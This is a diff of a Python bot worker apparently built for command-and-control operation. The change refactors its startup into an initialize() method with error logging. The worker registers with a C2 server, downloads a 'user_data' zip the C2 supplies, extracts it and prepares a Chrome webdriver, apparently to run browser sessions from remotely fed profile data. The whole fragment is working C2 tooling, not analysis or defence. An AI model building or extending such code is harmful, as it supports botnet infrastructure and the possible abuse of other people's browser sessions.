@@ -19,23 +19,31 @@ from webdriver_manager.chrome import ChromeDriverManager
 from utils import extract_zip, download_file, is_zip_file, remove_directory, send_data_to_c2
 from json import dumps
 from time import sleep
+import logging
 
 
 class Worker:
-    def __init__(self):
-        response = send_data_to_c2("POST", "initialize/", {})
-        user_data_file = download_file(response.get("user_data_path"))
-        if user_data_file == False:
-            return False
-            # raise HTTPException(status_code=400, detail="Cannot Download User Data File")
-        else:
-            if is_zip_file(user_data_file) == False:
+    
+    def initialize(self):
+        
+            response = send_data_to_c2("POST", "initialize/", {})
+            if response.status_code==500:
+                logging.error("error in c2 initialize ( check c2 logs )")
                 return False
-                # raise HTTPException(status_code=400, detail="Invalid zip file provided")
-        extracted_files = extract_zip(user_data_file)
-        remove_directory(user_data_file)
-        self.id = response.get("worker_id")
-        self.user_data_path = "user_data_extracted"
+            user_data_file = download_file(response.get("user_data_path"))
+            
+            if user_data_file == False:
+                logging.error("c2 dont sended any user data")
+                return False
+            else:
+                if is_zip_file(user_data_file) == False:
+                    logging.error("c2 dont sended any user data")
+                    return False
+                
+            extracted_files = extract_zip(user_data_file)
+            remove_directory(user_data_file)
+            self.id = response.get("worker_id")
+            self.user_data_path = "user_data_extracted"
 
     def _get_driver(self):
         print("Setup WebDriver...")
